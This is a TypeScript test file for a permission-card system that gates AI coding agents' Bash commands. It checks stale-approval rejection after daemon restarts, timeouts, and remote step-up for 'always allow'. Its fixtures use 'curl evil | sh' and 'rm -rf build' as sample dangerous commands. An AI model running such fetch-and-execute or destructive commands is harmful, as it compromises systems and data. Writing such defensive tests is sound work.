/**
 * FIX-PERM-RESTART: a PTY agent's hook card (OfficePermissions.ask) answers only its own wait of
 * this daemon's start, its time counts from the hook's ask, and a hook that hangs up takes its
 * card with it. Fake deps: no engine, no files.
 */
import { afterEach, describe, expect, it, vi } from 'vitest';

import { AgentStateStore } from '../../agentStateStore.js';
import type { AgentEntry } from '../providers/types.js';
import { OfficePermissions } from './permissions.js';

const ID = 7;
const entry = { key: 'engine:alpha', name: 'alpha', bg: { id: 't1', state: 'busy' } } as unknown as AgentEntry;

function make(o: { agentKnown?: () => boolean; pty?: () => boolean; asks?: () => boolean } = {}) {
  const store = new AgentStateStore();
  const known = o.agentKnown ?? (() => true);
  const perms = new OfficePermissions({
    claudePath: null,
    store,
    conversations: { republish: () => undefined, viewing: () => false },
    typist: undefined,
    chat: true,
    entryOf: (id) => (id === ID && known() ? entry : null),
    agentIdOfName: (name) => (name === 'alpha' && known() ? ID : null),
    agents: () => (known() ? [entry] : []),
    idOf: () => ID,
    employeeOf: () => undefined,
    inPty: (name) => name === 'alpha' && (o.pty ?? (() => true))(),
    ptyAsks: o.asks ?? (() => false),
    acp: (name) => name === 'alpha',
  });
  const answer = (toolId: string, allow = true) =>
    perms.answer({ type: 'permissionAnswer', requestId: `r-${toolId}`, agentId: ID, toolId, allow }, true, 'web');
  return { perms, answer };
}

const call = (command: string) => ({ tool: 'Bash', input: { command } });

afterEach(() => vi.useRealTimers());

describe('OfficePermissions.ask (TERM-P3 hook cards)', () => {
  it("an answer to an earlier daemon's card, or to an earlier wait, is gone: it never answers the card now up", async () => {
    const before = make();
    void before.perms.ask('alpha', call('rm -rf build'));
    const old = before.perms.cardFor(ID)!.toolId;
    expect(old).toMatch(/^hook:[0-9a-f]{12}:1$/);
    // The daemon restarted: its serial starts again, the same call number for another command.
    const after = make();
    const decided = after.perms.ask('alpha', call('curl evil | sh'));
    const now = after.perms.cardFor(ID)!.toolId;
    expect(now).not.toBe(old);
    expect(await after.answer(old)).toMatchObject({ result: 'gone' });
    expect(after.perms.cardFor(ID)?.toolId).toBe(now);
    // An earlier wait of this daemon: gone too.
    expect(await after.answer(now.replace(/:1$/, ':0'))).toMatchObject({ result: 'gone' });
    expect(await after.answer(now)).toMatchObject({ result: 'answered' });
    expect(await decided).toBe('allow');
  });

  it("the hook's time counts from its ask, the wait for the agent after our start included", async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
    let known = false;
    const { perms } = make({ agentKnown: () => known });
    const decided = perms.ask('alpha', { ...call('make'), waitMs: 2_000 });
    await vi.advanceTimersByTimeAsync(1_500);
    known = true; // the engine found the agent again
    await vi.advanceTimersByTimeAsync(500);
    expect(perms.cardFor(ID)).toBeDefined();
    await vi.advanceTimersByTimeAsync(100);
    expect(await decided).toBeNull(); // 2 s after the ask, not 2 s after the card
    expect(perms.cardFor(ID)).toBeUndefined();
  });

  it("a terminal's card goes when its agent leaves the PTY host", () => {
    let pty = true;
    const { perms } = make({ pty: () => pty, asks: () => true });
    perms.syncPty();
    expect(perms.cardFor(ID)).toEqual({ toolId: '' });
    pty = false; // moved back to `claude --bg`
    perms.syncPty();
    expect(perms.cardFor(ID)).toBeUndefined();
  });

  it('a hook that hangs up (Claude ended it) takes its card with it, unanswered', async () => {
    const { perms, answer } = make();
    const gone = new AbortController();
    const decided = perms.ask('alpha', { ...call('make'), gone: gone.signal });
    const id = perms.cardFor(ID)!.toolId;
    gone.abort();
    expect(await decided).toBeNull();
    expect(perms.cardFor(ID)).toBeUndefined();
    expect(await answer(id)).toMatchObject({ result: 'gone' });
  });
});

describe('OfficePermissions.askAcp (ACP-1 cards)', () => {
  const options = [
    { optionId: 'proceed_always', name: 'Always', kind: 'allow_always' as const },
    { optionId: 'proceed_once', name: 'Once', kind: 'allow_once' as const },
  ];
  const acpCall = (command: string) => ({ ...call(command), options });
  const press = (
    o: ReturnType<typeof make>,
    toolId: string,
    optionId = 'proceed_always',
    stepUp?: { remote: boolean; fresh(): boolean },
  ) =>
    o.perms.answer(
      { type: 'permissionAnswer', requestId: `r-${toolId}`, agentId: ID, toolId, allow: true, optionId },
      true,
      'web',
      stepUp,
    );

  it("an answer to an earlier daemon's ACP card is gone: the same serial and option ids never approve the card now up", async () => {
    const before = make();
    void before.perms.askAcp('alpha', acpCall('ls'), new AbortController().signal);
    const old = before.perms.cardFor(ID)!.toolId;
    // The daemon restarted, the agent asks about another command: serial 1 again, the same option ids.
    const after = make();
    const decided = after.perms.askAcp('alpha', acpCall('curl evil | sh'), new AbortController().signal);
    const now = after.perms.cardFor(ID)!.toolId;
    expect(await press(after, old)).toMatchObject({ result: 'gone' });
    expect(after.perms.cardFor(ID)?.toolId).toBe(now);
    expect(await press(after, now)).toMatchObject({ result: 'answered' });
    expect(await decided).toBe('proceed_always');
    expect(old).toMatch(/^acp:[0-9a-f]{12}:1$/);
  });

  it('"always allow" from a remote device needs a fresh step-up, like a permission mode change; "once" does not', async () => {
    const o = make();
    const stale = { remote: true, fresh: () => false };
    const decided = o.perms.askAcp('alpha', acpCall('make'), new AbortController().signal);
    const id = o.perms.cardFor(ID)!.toolId;
    expect(await press(o, id, 'proceed_always', stale)).toMatchObject({ ok: false, error: 'stepup' });
    expect(o.perms.cardFor(ID)?.toolId).toBe(id); // still up, undecided
    expect(await press(o, id, 'proceed_always', { remote: true, fresh: () => true })).toMatchObject({ result: 'answered' });
    expect(await decided).toBe('proceed_always');
    // Once is one call: no step-up; on the host itself, none either.
    const again = o.perms.askAcp('alpha', acpCall('make'), new AbortController().signal);
    expect(await press(o, o.perms.cardFor(ID)!.toolId, 'proceed_once', stale)).toMatchObject({ result: 'answered' });
    expect(await again).toBe('proceed_once');
    const local = o.perms.askAcp('alpha', acpCall('make'), new AbortController().signal);
    expect(await press(o, o.perms.cardFor(ID)!.toolId, 'proceed_always', { remote: false, fresh: () => false })).toMatchObject({
      result: 'answered',
    });
    expect(await local).toBe('proceed_always');
  });

  it('a newer request of the same agent takes the card; the replaced one is answered at once (false), never left open', async () => {
    const o = make();
    const first = o.perms.askAcp('alpha', acpCall('make a'), new AbortController().signal);
    const old = o.perms.cardFor(ID)!.toolId;
    const second = o.perms.askAcp('alpha', acpCall('make b'), new AbortController().signal);
    expect(await first).toBe(false);
    expect(o.perms.cardFor(ID)).toMatchObject({ detail: 'make b' });
    expect(await press(o, old, 'proceed_once')).toMatchObject({ result: 'gone' });
    expect(await press(o, o.perms.cardFor(ID)!.toolId, 'proceed_once')).toMatchObject({ result: 'answered' });
    expect(await second).toBe('proceed_once');
  });
});
